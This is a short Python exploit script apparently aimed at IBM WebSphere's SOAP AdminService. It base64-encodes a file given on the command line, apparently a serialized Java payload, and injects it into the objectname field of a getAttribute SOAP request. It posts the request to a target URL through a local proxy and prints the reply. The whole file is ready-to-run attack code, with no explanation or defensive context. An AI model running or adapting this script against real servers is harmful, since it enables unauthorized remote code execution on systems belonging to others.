websphere_soap.py

#!/usr/bin/python
# coding: utf-8
import requests
import sys
import base64
import time

url = sys.argv[1]
data = open(sys.argv[2],'rb').read().encode('base64').replace('\n','')

raw_data = """<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">
<LoginMethod>BasicAuth</LoginMethod>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">{}</objectname>
<attribute xsi:type="xsd:string">ringBufferSize</attribute>
</ns1:getAttribute>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>""".format(data)

target_url = url
headers = {
    "Content-Type":"text/xml; charset=utf-8",
    "SOAPAction":"\"urn:AdminService\""
}

r = requests.post(url=target_url, headers=headers, data=raw_data, proxies={"http":"http://127.0.0.1:8080"})
print(r.content)
